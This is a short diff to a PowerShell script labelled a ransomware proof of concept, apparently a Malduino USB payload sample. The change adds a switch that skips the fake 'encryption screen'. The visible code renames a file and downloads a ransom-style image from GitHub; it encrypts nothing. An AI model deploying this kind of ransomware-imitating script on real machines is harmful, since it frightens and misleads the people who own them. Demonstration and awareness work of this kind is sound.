@@ -1,4 +1,5 @@
 # BTBit Powershell Ransomware PoC 
+param([string]$showscreen)
 # file to rename
 $file = "test.txt"
 $drive = (get-location).Drive.Name
@@ -9,6 +10,7 @@ if (-not(Test-Path -Path $file_exist -PathType Leaf)) { exit }
 mv "$file" "$file.ren"
 #
 # show encryption screen
+if ($showscreen -eq "noscreen") {exit}
 $screen = $ENV:LOCALAPPDATA + "\screen_enc.jpg"  
 (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/pcmarcon/malduino-payload-samples/master/screen_enc.jpg", $screen)
 sleep 10
